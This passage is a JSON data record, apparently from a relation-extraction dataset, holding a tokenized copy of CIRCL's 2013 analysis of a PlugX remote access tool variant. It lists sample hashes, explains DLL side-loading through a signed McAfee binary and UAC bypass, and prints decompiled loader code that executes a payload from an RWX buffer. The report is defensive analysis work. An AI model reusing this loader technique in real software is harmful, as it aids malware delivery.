"h": 175, "t": 148, "evidence": [1245, 1266]}, {"r": "P21", "h": 176, "t": 148, "evidence": [1245, 1266]}, {"r": "P21", "h": 177, "t": 148, "evidence": [1245, 1266]}], "title": "201303CIRCLPlugX", "sents": [["Analysis", "Report", "(", "TLP", ":", "WHITE", ")"], ["Analysis", "of", "a", "PlugX", "variant", "(", "PlugX", "version", "7.0", ")"], ["Conducted", "by", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "Team", "CIRCL"], ["March", "29", ",", "2013"], ["Document", "version", ":", "1.0", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "Contents", "1", "Scope", "of", "work", "3", "2", "Analyzed", "samples", "2.1", "Limitations", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["2.2", "Sharing", ".", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["3", "6", "6", "3", "Executive", "summary", "6", "4", "Analysis", "4.1", "Techniques", "used", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["."], ["4.2", "Execution", "process", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.2.1", "Diagram", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.2.2", "Explanation", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.3", "Implemented", "commands", ".", ".", "."], [".", "."], [".", "."], [".", "."], ["4.4", "Command", "details", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.1", "Option", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.2", "Disk", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.3", "Screen", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.4", "Process", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.5", "Service", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.6", "Shell", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.7", "Telnet", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.8"], ["RegEdit", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.9"], ["Nethood", ".", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["."], ["4.4.10", "Portmap", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["4.4.11", "SQL", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.12", "Netstat", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.4.13", "Keylogger", ".", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["4.5", "Other", "notable", "commands", "and", "functions", "4.5.1", "log", ".", ".", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["."], ["4.6", "Persistency", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.7", "Control", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["4.8", "Network", "and", "domain", "information", ".", "."], [".", "."], ["4.8.1", "Network", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.8.2"], ["Domain", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["4.9", "Current", "version", "and", "history", "of", "PlugX", ".", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["A", "Appendix", "A.1", "Indicators", "of", "Compromise", "(", "IOC", ")", "."], [".", "."], [".", "."], [".", "."], ["A.1.1", "Pipes", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["A.1.2", "Files", "and", "directories", ".", ".", "."], [".", "."], [".", "."], [".", "."], ["."], ["A.1.3", "Registry", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", ".", "."], ["A.1.4", "Network", "(", "hostname", "and", "destination", "IP", "A.2", "References", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["A.3", "VirusTotal", "results", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["Page", "2", "of", "21", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["6", "6", "7", "7", "7", "10", "12", "12", "12", "12", "12", "12", "12", "13", "13", "13", "13", "13", "13", "13", "13", "13", "15", "15", "16"], ["16"], ["17", "18", ".", ".", ".", ".", ".", ".", "."], ["."], [".", "."], [".", "."], [".", "."], ["."], [".", "."], [".", "."], [".", "."], ["."], [".", "."], [".", "."], [".", "."], ["addresses", ")", ".", ".", ".", ".", ".", ".", "."], ["."], [".", "."], [".", "."], [".", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["18", "18", "18", "18", "19", "19", "19", "20", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "1", "March", "29", ",", "2013"], ["Scope", "of", "work"], ["This", "report", "is", "the", "analysis", "of", "a", "Remote", "Access", "Tool", "(", "RAT", ")", "which", "we", "call", "a", "variant", "of", "Plugx1", "."], ["Plugx", "is", "an", "interesting", "piece", "of", "malware", "for", "several", "reasons", ":", "\u2022"], ["It", "demonstrates", "the", "attack", "principle", "of", "the", "fastest", "/", "cheapest", "path", "of", "attack2", "by", "abusing", "perfectly", "valid", "signed", "binaries", "to", "perform", "the", "attack"], ["\u2022"], ["It", "features", "ways", "to", "defeat", "other", "protection", "mechanisms", "like", "UAC3", "\u2022"], ["In", "contrast", "to", "many", "other", "pieces", "of", "malware", ",", "the", "author4", "shows", "the", "ability", "to", "write", "good", "code", ",", "especially", "doing", "logging", "the", "right", "way", "to", "improve", "the", "piece", "of", "software"], ["\u2022", "It", "appears", "to", "be", "modularized", "and", "easily", "extensible", "2", "Analyzed", "samples"], ["\u2022", "Sample", "A", "-", "Stage", "1", "of", "Malware", "\u2013", "Description"], ["*", "Hash", "found", "in", "a", "malware", "database", "\u2013"], ["Original", "\ufb01lename", "*", "update.exe", "\u2013", "Hashes"], ["*", "MD5", ":", "f1f48360f95e1b43e9fba0fec5a2afb8", "*", "SHA1", ":", "70ceb467db7b0161d22e4545479f747417b9705a", "*", "SHA-256", ":", "2bc5ce39dd9afe2157448d3f6d8cb9c549ed39543d159616e38480b9e6c11c49"], ["\u2013", "Filetype"], ["*"], ["PE32", "executable", "(", "GUI", ")", "Intel", "80386", ",", "for", "MS", "Windows", ",", "RAR", "self", "-", "extracting", "archive"], ["\u2013"], ["Filesize", "*", "370702", "Bytes", "(", "326", "KB", ")"], ["\u2013", "Compile", "time"], ["*"], ["Sat", "Jun", "9", "15:19:49", "2012"], ["\u2022", "Sample", "B", "-", "Valid", ",", "signed", "McAfee", "binary", "\u2013", "Description"], ["*", "File", "dropped", "by", "Sample", "A"], ["\u2013"], ["Original", "\ufb01lename", "*"], ["mcvsmap.exe", "\u2013", "Hashes", "1", "Known", "variant", "names", ":", "Gulpix", ",", "Korplug", "2", "http://satoss.uni.lu/seminars/srm/pdfs/2012-Alexandre-Dulaunoy.pdf", "3", "http://msdn.microsoft.com/en-us/library/windows/desktop/bb756996.aspx", "4"], ["For", "better", "readability", "we", "do", "not", "distinguish", "between", "a", "single", "author", "or", "a", "group", "of", "authors", "."], ["Hence", "the", "expression", "is", "a", "synonym", "for", "\u201d", "the", "authors", "\u201d", "Page", "3", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "*", "MD5", ":"], ["4e1e0b8b0673937415599bf2f24c44ad", "*", "SHA1", ":", "9224de3af2a246011c6294f64f27206d165317ba"], ["*", "SHA-256", ":", "ae16e10e621d6610a3f7f2c7122f9d1263700ba02d1b90e42798decb2fe84096"], ["\u2013", "Filetype"], ["*", "PE32", "executable", "(", "GUI", ")", "Intel", "80386", ",", "for", "MS", "Windows"], ["\u2013"], ["Filesize", "*", "262672", "Bytes", "(", "257", "K", ")", "\u2013", "Compile", "time"], ["*"], ["Fri", "May", "8", "17:59:52", "2009", "\u2013", "Authenticode5", "veri\ufb01cation", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"], ["17", "18", "19", "V", "e", "r", "i", "f", "i", "e", "d", ":", "Signed", "Signers", ":"], ["McAfee", ",", "Inc", "."], ["VeriSign", "Class", "3", "Code", "Signing", "2004", "CA", "Class", "3", "Public", "Primary", "C", "e"], ["r", "t", "i", "f", "i", "c", "a", "t", "i", "o", "n", "Authority", "Signing", "date", ":", "5", ":", "2", "4", "PM", "5/8/2009"], ["P", "u", "b", "l", "i", "s", "h", "e", "r", ":", "McAfee", ",", "Inc", "."], ["D", "e", "s", "c", "r", "i", "p", "t"], ["i", "o", "n", ":", "McAfee", "VirusMap", "Reporting", "module", "Product", ":", "McAfee", "VirusScan", "API"], ["Version", ":", "1", "3", ",", "1", "1", ",", "0", ",", "0"], ["F", "i", "l", "e", "v", "e", "r", "s", "i", "o", "n", ":", "13", ",", "11", ",", "102", ",", "0"], ["Strong", "Name", ":"], ["Unsigned", "O", "r", "i", "g", "i", "n", "a", "l", "Name", ":", "McVsMap", ".", "EXE"], ["I", "n", "t", "e", "r", "n", "a", "l", "Name", ":", "McVsMap"], ["Copyright", ":", "Copyright", "\ufffd", "2008", "McAfee", ",", "Inc", "."], ["Comments", ":", "n", "/", "a"], ["MD5", ":", "4", "e1e0b8b0673937415599bf2f24c44ad", "SHA1", ":", "9224", "de3af2a246011c6294f64f27206d165317ba", "SHA256", ":", "ae16e10e621d6610a3f7f2c7122f9d1263700ba02d1b90e42798decb2fe84096", "\u2022", "Sample", "C", "-", "DLL", "to", "be", "loaded", "by", "Sample", "B", ",", "loads", "Sample", "D"], ["\u2013"], ["Description"], ["*", "File", "dropped", "by", "Sample", "A"], ["\u2013"], ["Original", "\ufb01lename", "*", "McUtil", ".", "DLL", "\u2013", "Hashes"], ["*", "MD5", ":", "ad4a646b38a482cc07d5b09b4\ufb00fd3b3", "*", "SHA1", ":", "ae0f9bf2740d00c5d485827eb32aca33feaa3a90"], ["*", "SHA-256", ":", "0a99238e1ebebc47d7a89b2ccddfae537479f7f77322b5d4941315d3f7e5ca48"], ["\u2013", "Filetype"], ["*"], ["PE32", "executable", "(", "DLL", ")", "(", "GUI", ")", "Intel", "80386", ",", "for", "MS", "Windows"], ["\u2013"], ["Filesize", "*", "49152", "Bytes", "(", "48", "K", ")", "5"], ["http://msdn.microsoft.com/en-us/library/ms537359%28v=vs.85%29.aspx"], ["Page", "4", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "\u2013", "Compile", "time"], ["*", "We", "d", "Mar", "13", "02:52:28", "2013"], ["\u2022", "Sample", "D", "-", "Malicious", "payload", "to", "be", "loaded", "by", "Sample", "C", "\u2013", "Description"], ["*", "File", "dropped", "by", "Sample", "A"], ["\u2013"], ["Original", "\ufb01lename", "*", "McUtil", ".", "DLL.PPT", "\u2013", "Hashes"], ["*", "MD5", ":", "545bb4365a9b7cdb6d22844ebeedda93"], ["*", "SHA1", ":", "a267f1183b4\ufb00843d68a63264846abf78cc71d1f"], ["*", "SHA-256", ":"], ["d4fe890a08d4dd44b58a3b85b2a7e89536338099c1c42a9b7e85f4007b0a37b7", "\u2013", "Filetype", "*", "pure", "code", "(", "IA32", ")", "without", "headers", "\u2013", "Filesize", "*", "124820", "Bytes", "(", "122", "K", ")", "\u2013", "Compile", "time", "*", "unknown", "(", "pure", "code", ")"], ["\u2022", "Sample", "E", "-", "Stage", "2", "of", "Malware", "\u2013"], ["Description", "*", "Extracted", "malware", "from", "memory", "\u2013", "Original", "\ufb01lename", "*", "dump00C60000.bin", "\u2013", "Hashes"], ["*", "MD5", ":", "65ceb039e7b4731a165cfee081e220af"], ["*", "SHA1", ":", "b49766187971e3070644a9de2054bc93241b2263", "*", "SHA-256", ":", "deeac56026f3804968348c8afa5b7aba10900aeabee05751c0fcac2b88c\ufb0071e", "\u2013", "Filetype"], ["*"], ["PE32", "executable", "(", "DLL", ")", "(", "GUI", ")", "Intel", "80386", ",", "for", "MS", "Windows"], ["\u2013"], ["Filesize", "*", "176128", "Bytes", "(", "172", "K", ")"], ["\u2013"], ["Compile", "time"], ["*", "Mon", "Nov", "26", "04:46:01", "2012"], ["\u2022", "Sample", "F", "-", "UAC", "circumvention", "\u2013", "Description"], ["*"], ["File", "temporarily", "created", "on", "\ufb01lesystem", "\u2013", "Original", "\ufb01lename"], ["Page", "5", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "*", "UAC.TMP", "\u2013", "Hashes"], ["*", "MD5", ":", "52df5c2c07433e2a8f054c2347acb3b4", "*", "SHA1", ":", "8051474c1fc0d8f404a42ea32eca1699e54f02e1"], ["*", "SHA-256", ":", "dc09091e5d0ce03c6144748f17bd636f2f0b2ca56f88b550c1d48860596dbdb1", "\u2013"], ["Filetype"], ["*"], ["PE32", "executable", "(", "DLL", ")", "(", "GUI", ")", "Intel", "80386", ",", "for", "MS", "Windows"], ["\u2013"], ["Filesize", "*", "2560", "Bytes", "(", "2.5", "K", ")"], ["\u2013"], ["Compile", "time"], ["*", "Thu", "Mar", "29", "08:03:43", "2012", "2.1"], ["Limitations"], ["This", "work", "has", "been", "done", "with", "utmost", "care", ",", "following", "best", "practices", "in", "software", "reversing", ",", "forensic", "investigations", "and/or", "information", "gathering", "."], ["However", ",", "the", "work", "is", "only", "covering", "small", "aspects", "(", "based", "on", "the", "indicators", "given", ",", "lacking", "full", "context", ")", "and", "not", "an", "exhaustive", "analysis", ",", "and", "hence", "the", "report", "is", "as", "-", "is", ",", "not", "giving", "any", "guarantees", "of", "completeness", "or", "claiming", "absolute", "accuracy", "."], ["This", "work", "is", "provided", "for", "information", "only", "."], ["2.2"], ["Sharing", "The", "document", "is", "classi\ufb01ed", "as", "TLP", ":", "WHITE", ",", "CIRCL", "authorizes", "everyone", "to", "share", "this", "analysis", "report", "as", "-", "is", "without", "modi\ufb01cation", "."], ["3", "Executive", "summary"], ["The", "analyzed", "malicious", "software", "is", "an", "exhaustive", "Remote", "Access", "Tool", "(", "RAT", ")", "that", "defeats", "several", "protection", "methods", "of", "modern", "Windows", "operating", "systems", ",", "including", "execution", "of", "signed", "code", "and", "defeating", "UAC", "in", "Windows", "7", "."], ["It", "comes", "with", "a", "multitude", "of", "functionalities", "that", "are", "well", "implemented", "."], ["4", "4.1", "Analysis", "Techniques", "used", "The", "analysis", "has", "been", "done", "using", "a", "mixed", "-", "approach", "of", "dynamic", "analysis", "and", "static", "analysis", "in", "order", "to", "overcome", "some", "of", "the", "obfuscation", "and", "encryptions", "used", "by", "the", "malware", "."], ["Some", "of", "the", "techniques", "might", "have", "also", "an", "impact", "on", "the", "interpretation", "of", "the", "malware", "."], ["Unfortunately", ",", "when", "we", "started", "this", "investigation", ",", "the", "IP", "address", "is", "no", "longer", "accepting", "connections", "on", "the", "given", "ports", "when", "tested", "on", "2013", "-", "03", "-", "26", "."], ["An", "interaction", "following", "the", "protocol", "of", "this", "malware", "is", "therefore", "no", "longer", "possible", "."], ["Page", "6", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg"], ["c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "4.2", "4.2.1", "March", "29", ",", "2013", "Execution", "process", "Diagram", "."], [".drops", "."], ["Sample", "B"], ["l.", "oads", ".into", "."], ["A", "Sample", ".drops", "."], [".drops"], ["Sample", "C"], ["l.", "oads", ".into", "."], ["Sample", "D", ".execution", "."], [".decryption"], ["Sample", "E", ".W", "indows", "7", ":", "def", "eat", "U", "AC", ".execution", ".inject", ".Legend", "."], ["svchost.exe", ".k", "ill", ".inject", "."], ["."], ["Sample", "F", "."], [".execution"], ["Signed", "code", "Neutral", "code", "."], ["."], ["."], ["msiexec.exe", "4.2.2", "Malicious", "code", "Explanation", "Sample", "A", "is", "a", "self", "-", "extracting", "archive", "which", "contains", "three", "\ufb01les", ",", "Sample", "B", ",", "Sample", "C", "and", "Sample", "D."], ["It", "is", "assumed", "that", "Sample", "A", "is", "a", "part", "of", "another", "attack", "vector", ",", "like", "PDF", "or", "O\ufb03ce", "document", "attacks", "where", "the", "user", "just", "opens", "a", "crafted", "document", "which", "exploits", "the", "document", "reader", ",", "drops", "and", "opens", "both", "a", "readable", "document", "and", "a", "malicious", "\ufb01le", "like", "Sample", "A.", "1", "Type", "=", "Rar", "2", "Solid", "=", "\u2212", "Page", "7", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "March", "29", ",", "2013", "Blocks", "=", "3"], ["Multivolume", "=", "\u2212"], ["Volumes", "=", "1"], ["Date", "Time"], ["Attr"], ["Size", "Compressed", "Name", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "2009\u221205\u221214", "0", "0", ":", "5", "6", ":", "1", "2", ".", ".", ".", "."], ["A", "262672", "119784", "mcvsmap", ".", "exe"], ["2013\u221203\u221213", "0", "9", ":", "5", "2", ":", "2", "8", ".", ".", ".", "."], ["A", "49152", "20285"], ["McUtil", ".DLL"], ["2013\u221203\u221213", "1", "4", ":", "5", "6", ":", "1", "2", ".", ".", ".", "."], ["A", "124820", "124820"], ["McUtil", ".DLL.PPT", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212\u2212", "436644", "264889", "3", "f", "i", "l", "e", "s", ",", "0"], ["f", "o", "l", "d", "e", "r", "s", "Executing", "the", "self", "-", "extracting", "archive", "extracts", "the", "\ufb01les", "and", "runs", "mcvsmap.exe", "(", "Sample", "B", ")", "."], ["Sample", "B", "is", "a", "valid", "signed", "\ufb01le", "that", "the", "author", "of", "the", "malware", "took", "from", "a", "software", "bundle", "from", "McAfee", "."], ["Sample", "B", ",", "when", "executed", ",", "attempts", "to", "load", "a", "\ufb01le", "McUtil", ".", "DLL", "from", "the", "same", "directory", ",", "which", "usually", "is", "another", "component", "of", "McAfee", "."], ["The", "malware", "author", "instead", "bundled", "the", "valid", "McAfee", "\ufb01le", "Sample", "B", "with", "a", "custom", "DLL", "(", "Sample", "C", ")", "."], ["Since", "the", "\ufb01le", "will", "be", "loaded", "without", "hesitation"], ["(", "there", "are", "no", "protection", "mechanisms", "implemented", ";", "neither", "does", "McAfee", "check", "if", "the", "imported", "\ufb01le", "meets", "any", "conditions", "nor", "is", "any", "protection", "implemented", "for", "loading", "unsigned", "libraries", "in", "signed", "code", ")", ",", "the", "signed", "Sample", "B", "jumps", "into", "the", "beginning", "of", "the", "code", "section", "of", "Sample", "C", "(", "via", "Push", "/", "Return", "):", "At", "the", "target", "location", "the", "following", "code", "is", "executed", ":", "1", "read_execute_file", "(", ")"], ["2", "{", "3", "NumberOfBytesRead", "=", "GetModuleFileNameW", "(", "hModule", ",", "&", "filename", ",", "0x2000u", ")", ";", "4", "lstrcatW(&filename", ",", "L\"", "."], ["PPT", "\"", ")", ";", "5", "hFile_mcutil", "."], ["d", "l", "l", "."], ["ppt", "=", "CreateFileW(&filename", ",", "GENERIC_READ", ",", "1u", ",", "0", ",", "OPEN_EXISTING", ",", "0", ",", "0", ")", ";", "6", "if", "(", "hFile_mcutil", "."], ["d", "l", "l", "."], ["ppt", "=", "=", "\u22121", ")", "7", "{", "8", "r", "e", "s", "u", "l", "t", "=", "GetLastError", "(", ")", ";", "9", "}", "10", "else", "11", "{", "12", "b", "u", "f", "f", "e", "r", "=", "V"], ["i", "r", "t", "u", "a", "l", "A", "l", "l", "o", "c", "(", "0", ",", "0x100000u", ",", "MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE", ")", ";", "13", "if", "(", "b", "u", "f", "f", "e", "r", "&", "&", "ReadFile", "(", "hFile_mcutil", "."], ["d", "l", "l", "."], ["ppt", ",", "b", "u", "f", "f", "e", "r", ",", "0x100000u", ",", "&", "NumberOfBytesRead", ",", "0", ")", ")"], ["14", "{", "15"], ["CloseHandle", "(", "hFile_mcutil", "."], ["d", "l", "l", ".", "ppt", ")", ";", "16", "buffer", "(", ")", ";", "17", "Sleep", "(", "0xFFFFFFFF", ")", ";", "18", "Sleep", "(", "0xFFFFFFFF", ")", ";", "19", 